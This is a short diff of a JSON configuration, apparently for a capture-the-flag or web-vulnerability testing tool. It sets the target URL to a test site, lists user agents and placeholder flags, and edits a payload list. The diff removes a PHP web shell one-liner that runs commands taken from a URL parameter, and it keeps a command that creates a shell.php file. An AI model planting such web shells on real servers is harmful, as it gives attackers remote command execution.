@@ -1,6 +1,7 @@
 {
+    "flag_format": "KCTF",
     "urls": [
-        "http://4chan.org"
+        "http://vulnweb.com"
     ],
     "user_agents": [
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
@@ -18,7 +19,7 @@
         "flag{asd}"
     ],
     "payload": [
-        "<?php system($_GET['cmd']);?>",
-        "mkdir temp/;cd temp;touch shell.php;echo 'hi' > shell.php"
+        "mkdir temp/;cd temp;touch shell.php;echo 'hi' > shell.php",
+        "test asda asd"
     ]
 }
